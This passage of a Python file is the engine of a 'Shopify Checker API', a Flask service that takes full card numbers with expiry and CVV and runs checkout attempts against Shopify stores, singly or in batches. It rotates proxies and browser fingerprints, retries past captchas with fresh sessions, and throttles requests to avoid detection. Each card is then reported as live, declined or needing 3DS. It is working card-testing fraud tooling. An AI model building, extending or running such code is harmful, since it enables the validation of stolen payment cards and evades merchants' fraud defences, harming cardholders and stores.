    except asyncio.TimeoutError:
        return False, "REQUEST_TIMEOUT", gateway, total_price, currency, ("Dead" if proxy_str else pstat)
    except aiohttp.ClientError as e:
        return False, f"CONNECTION_ERROR: {e}", gateway, total_price, currency, ("Dead" if proxy_str else pstat)
    except Exception as e:
        ps = "Dead" if (proxy_str and is_proxy_err(e)) else pstat
        return False, f"Error Processing Card: {e}", gateway, total_price, currency, ps


# ==============================================================================
#  [FIX-4] RETRY WRAPPER — captcha gets a brand-new fingerprint + session
# ==============================================================================

_RETRYABLE = ("required_artifacts", "artifacts_unavailable", "stale_artifact",
              "signature_mismatch", "checkpoint_data_invalid",
              "timeout", "connection", "throttled", "network", "unreachable", "reset",
              "eof", "broken pipe", "chunked", "unexpected", "rate_limited",
              "server disconnected", "connection_error", "unparseable",
              "checkout_session_failed", "generic_error")


def _is_retryable(msg):
    m = str(msg).lower()
    return any(k in m for k in _RETRYABLE)


def _is_captcha_msg(msg):
    return "CAPTCHA_REQUIRED" in str(msg).upper()


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None,
                       proxy_str=None, max_retries=None, overrides=None):
    retries = MAX_RETRIES if max_retries is None else max_retries
    captcha_budget = CAPTCHA_RETRY
    last = None

    for attempt in range(retries + 1):
        fp = new_fingerprint()
        res = await _process_card(cc, mes, ano, cvv, site_url, variant_id,
                                  proxy_str, overrides, fp)
        last = res
        if res[0] is True:
            return res

        if _is_captcha_msg(res[1]) and captcha_budget > 0:
            captcha_budget -= 1
            await asyncio.sleep(0.6 + random.random() * 0.9)
            continue

        if _is_retryable(res[1]) and attempt < retries:
            await asyncio.sleep(0.3 * (2 ** attempt))
            continue
        return res

    return last


# ==============================================================================
#  CONCURRENCY ENGINE
# ==============================================================================

_loop = None
_loop_thread = None
_global_sem = None
_user_sems = {}
_start_gate_lock = None
_last_start = 0.0

STATS = {
    "total": 0,
    "ok": 0,
    "captcha": 0,
    "declined": 0,
    "started": time.time(),
}
_stats_lock = threading.Lock()


def _bg(loop):
    asyncio.set_event_loop(loop)
    global _global_sem
    _global_sem = asyncio.Semaphore(GLOBAL_MAX_CONCUR)
    loop.run_forever()


def get_loop():
    global _loop, _loop_thread
    if _loop is None or _loop.is_closed():
        _loop = asyncio.new_event_loop()
        _loop_thread = threading.Thread(target=_bg, args=(_loop,), daemon=True)
        _loop_thread.start()
    return _loop


def _gate_lock():
    global _start_gate_lock
    if _start_gate_lock is None:
        _start_gate_lock = asyncio.Lock()
    return _start_gate_lock


async def _admit():
    global _last_start
    async with _gate_lock():
        now = time.time()
        wait = START_STAGGER - (now - _last_start)
        if wait > 0:
            await asyncio.sleep(wait)
        _last_start = time.time()


async def _throttled(cc, mes, ano, cvv, site, variant, proxy, user_key="default",
                     overrides=None, max_retries=None):
    if user_key not in _user_sems:
        _user_sems[user_key] = asyncio.Semaphore(PER_USER_CONCUR)
    async with _user_sems[user_key]:
        async with _global_sem:
            await _admit()
            return await process_card(cc, mes, ano, cvv, site, variant, proxy,
                                      max_retries, overrides)


def _bump(field, n=1):
    with _stats_lock:
        STATS[field] = STATS.get(field, 0) + n


def _build_result(cc_string, success, message, gateway, price, currency,
                  elapsed=None, proxy_status="Not Used"):
    resp = clean_resp(message)
    _3ds = ("THREE_D_SECURE_REQUIRED", "AUTHENTICATION_REQUIRED", "THREE_DS_REDIRECT",
            "PAYMENTS_THREE_D_SECURE_REQUIRED", "SCA_REQUIRED", "3DS_REQUIRED")
    if resp.upper() in _3ds or "three_d_secure" in resp.lower():
        resp = "3DS_REQUIRED"
    elif "OTP" in resp.upper() and resp.upper() != "OTP_REQUIRED":
        resp = "OTP_REQUIRED"
    try:
        pf = round(float(price), 2)
    except (ValueError, TypeError):
        pf = 0.0
    ps = proxy_status if proxy_status in ("Live", "Dead", "Not Used") else (
        "Live" if proxy_status else "Not Used")
    return {
        "cc": cc_string,
        "Gateway": gateway or "UNKNOWN",
        "Response": resp,
        "Price": pf,
        "Currency": currency or "USD",
        "Status": bool(success),
        "Proxy": ps,
        "Time": f"{float(elapsed):.2f}s" if elapsed is not None else "0.00s",
    }


# ==============================================================================
#  FLASK APP
# ==============================================================================

app = Flask(__name__)
try:
    app.json.sort_keys = False
except Exception:
    pass
logging.getLogger("werkzeug").setLevel(logging.ERROR)


def _parse_card(s):
    p = [x.strip() for x in str(s).split("|")]
    if len(p) != 4:
        raise ValueError("Invalid card format. Use: CARD|MM|YYYY|CVV")
    cc, mes, ano, cvv = p
    if len(ano) == 2:
        ano = "20" + ano
    mes = mes.zfill(2)
    return {"cc": cc, "mes": mes, "ano": ano, "cvv": cvv}


def _addr_overrides(args):
    m = {"first": "first", "last": "last", "email": "email", "phone": "phone",
         "address1": "address1", "address": "address1", "city": "city",
         "state": "zoneCode", "zip": "postalCode", "country": "countryCode"}
    out = {}
    for qk, ak in m.items():
        v = args.get(qk)
        if v:
            out[ak] = v
    return out or None


def _pick_proxy(raw):
    if not raw:
        return None
    raw = raw.strip()
    if "," in raw:
        opts = [x.strip() for x in raw.split(",") if x.strip()]
        return random.choice(opts) if opts else None
    return raw


def _int_arg(args, name, default):
    try:
        return int(args.get(name))
    except (TypeError, ValueError):
        return default


@app.route("/shopify", methods=["GET"])
def shopify():
    try:
        t0 = time.time()
        site = request.args.get("site")
        card_s = request.args.get("card") or request.args.get("cc")
        proxy = _pick_proxy(request.args.get("proxy"))
        if not proxy:
            proxy = _auto_proxy()
        user_key = request.args.get("key", "default")
        variant = request.args.get("variant")
        overrides = _addr_overrides(request.args)
        max_retries = _int_arg(request.args, "retries", None)

        if not site:
            return jsonify({"error": "Missing 'site'", "status": False}), 400
        if not card_s:
            return jsonify({"error": "Missing 'card'", "status": False}), 400
        try:
            p = _parse_card(card_s)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        _bump("total")
        loop = get_loop()
        fut = asyncio.run_coroutine_threadsafe(
            _throttled(p["cc"], p["mes"], p["ano"], p["cvv"], site, variant,
                       proxy, user_key, overrides, max_retries),
            loop,
        )
        ok, msg, gw, price, cur, pstat = fut.result(timeout=150)
        out = _build_result(card_s, ok, msg, gw, price, cur, time.time() - t0, pstat)
        out["site"] = site

        if ok:
            _bump("ok")
        elif "CAPTCHA" in out["Response"].upper():
            _bump("captcha")
        else:
            _bump("declined")

        print(f"{out['cc']}  {out['Response']}  ${out['Price']} {out['Currency']}  "
              f"{out['Time']}  [{out['Proxy']}]  {site}")
        return jsonify(out)

    except Exception as e:
        return jsonify(_build_result(
            request.args.get("card") or request.args.get("cc", ""), False,
            f"ERROR: {e}", "UNKNOWN", 0.0, "USD", 0.0,
            "Dead" if request.args.get("proxy") else "Not Used",
        )), 500


@app.route("/batch", methods=["POST"])
def batch():
    try:
        t0 = time.time()
        data = request.get_json(force=True)
        site = data.get("site", "")
        cards = data.get("cards", [])
        variant = data.get("variant")
        user_key = request.args.get("key", "default")
        overrides = _addr_overrides(data) or _addr_overrides(request.args)
        proxies = data.get("proxies", []) or ([data["proxy"]] if data.get("proxy") else [])
        max_retries = data.get("retries", None)
        if not isinstance(max_retries, int):
            max_retries = None

        if not site:
            return jsonify({"error": "Missing 'site'", "status": False}), 400
        if not isinstance(cards, list) or not cards:
            return jsonify({"error": "Missing 'cards'", "status": False}), 400

        parsed = []
        for i, c in enumerate(cards):
            px = proxies[i % len(proxies)] if proxies else _auto_proxy()
            try:
                parsed.append((c.strip(), _parse_card(c.strip()), px))
            except ValueError:
                parsed.append((c.strip(), None, px))

        _bump("total", len(parsed))
        loop = get_loop()

        async def _run():
            async def one(cs, p, px):
                if p is None:
                    return cs, False, "Invalid card format", "UNKNOWN", "0.00", "USD", (
                        "Dead" if px else "Not Used")
                try:
                    return cs, *await _throttled(p["cc"], p["mes"], p["ano"], p["cvv"],
                                                 site, variant, px, user_key,
                                                 overrides, max_retries)
                except Exception as ex:
                    return cs, False, str(ex), "UNKNOWN", "0.00", "USD", (
                        "Dead" if px else "Not Used")
            return await asyncio.gather(*[one(*x) for x in parsed])

        fut = asyncio.run_coroutine_threadsafe(_run(), loop)
        results = fut.result(timeout=600)
        out = [_build_result(cs, ok, msg, gw, price, cur, None, ps)
               for cs, ok, msg, gw, price, cur, ps in results]
        for r in out:
            r["site"] = site
        return jsonify({"results": out, "total_time": f"{time.time() - t0:.2f}s",
                        "total_cards": len(out)})
    except Exception as e:
        return jsonify({"error": str(e), "status": False}), 500


@app.route("/")
def health():
    return jsonify({"status": "ok", "engine": "running", "ports": [PORT] + _extra_ports()})


@app.route("/status")
def status():
    return jsonify({
        "status": "online",
        "global_max": GLOBAL_MAX_CONCUR,
        "per_user": PER_USER_CONCUR,
        "active_users": len(_user_sems),
        "proxy_pool_optional": len(PROXY_POOL),
        "cached_sites": len(_SITE_CACHE),
        "fingerprint_mode": FINGERPRINT_MODE,
        "force_close": FORCE_CLOSE,
        "ports": [PORT] + _extra_ports(),
        "endpoints": {
            "single": "GET /shopify?card=CARD|MM|YYYY|CVV&site=DOMAIN&proxy=host:port",
            "batch": "POST /batch {site,cards[],proxies[]}",
            "stats": "GET /stats",
        },
    })


@app.route("/stats")
def stats():
    with _stats_lock:
        s = dict(STATS)
    s["uptime_sec"] = round(time.time() - s.get("started", time.time()), 1)
    return jsonify(s)


# ==============================================================================
#  [FIX-5] MULTI PORT SERVER
# ==============================================================================

def _extra_ports():
    raw = _EXTRA_PORTS_RAW or ""
    out = []
    for piece in raw.split(","):
        piece = piece.strip()
        if not piece:
            continue
        try:
            pnum = int(piece)
        except ValueError:
            continue
        if pnum != PORT and pnum not in out:
            out.append(pnum)
    return out


def _serve_on(port):
    try:
        from waitress import serve
        serve(app, host="0.0.0.0", port=port, threads=THREADS)
    except ImportError:
        app.run(host="0.0.0.0", port=port, debug=False, threaded=True, use_reloader=False)


def main():
    global PORT, _EXTRA_PORTS_RAW, THREADS, MAX_RETRIES, CAPTCHA_RETRY, FINGERPRINT_MODE

    ap = argparse.ArgumentParser(description="Shopify Checker API")
    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--extra-ports", type=str, default=_EXTRA_PORTS_RAW,
                    help="comma separated extra ports, e.g. 9092 or 9092,9093")
    ap.add_argument("--threads", type=int, default=THREADS)
    ap.add_argument("--retries", type=int, default=MAX_RETRIES)
    ap.add_argument("--captcha-retry", type=int, default=CAPTCHA_RETRY)
    ap.add_argument("--fingerprint", choices=["fixed", "random"], default=FINGERPRINT_MODE)
    args = ap.parse_args()

    PORT = args.port
    _EXTRA_PORTS_RAW = args.extra_ports
    THREADS = args.threads
    MAX_RETRIES = args.retries
    CAPTCHA_RETRY = args.captcha_retry
    FINGERPRINT_MODE = args.fingerprint

    get_loop()

    extras = _extra_ports()
    print(f"[ENGINE] main_port={PORT} extra_ports={extras or 'none'} "
          f"global={GLOBAL_MAX_CONCUR} per_user={PER_USER_CONCUR} "
          f"fp={FINGERPRINT_MODE} force_close={FORCE_CLOSE} "
          f"retries={MAX_RETRIES} captcha_retry={CAPTCHA_RETRY} pool={len(PROXY_POOL)}")

    for pnum in extras:
        threading.Thread(target=_serve_on, args=(pnum,), daemon=True).start()
        print(f"[ENGINE] extra listener on 0.0.0.0:{pnum}")

    _serve_on(PORT)


if __name__ == "__main__":
    main()